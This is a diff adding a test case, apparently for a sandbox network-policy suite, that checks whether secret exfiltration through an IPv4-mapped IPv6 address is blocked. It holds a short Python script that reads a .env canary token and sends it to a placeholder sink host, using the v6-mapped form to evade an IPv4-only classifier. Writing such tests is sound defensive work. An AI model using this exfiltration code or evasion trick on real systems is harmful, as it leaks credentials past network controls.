@@ -1,0 +1,34 @@
+# The external address is written as an IPv4-mapped IPv6 literal
+# (::ffff:192.0.2.1) over an AF_INET6 socket, to dodge a classifier that only
+# understands bare IPv4. peer_class maps v4-mapped v6 back to v4 before
+# labelling, so it is still `external` and the connect must be refused.
+name = "ipv4-mapped-ipv6-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "v6.py"
+contents = """
+import socket
+secret = open(".env", "rb").read()
+s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+try:
+    s.connect(("::ffff:{SINK_HOST}", {SINK_PORT}))
+    s.sendall(secret)
+except PermissionError:
+    pass
+except OSError:
+    pass
+"""
+
+[[steps]]
+shell = 0
+run = "python3 v6.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
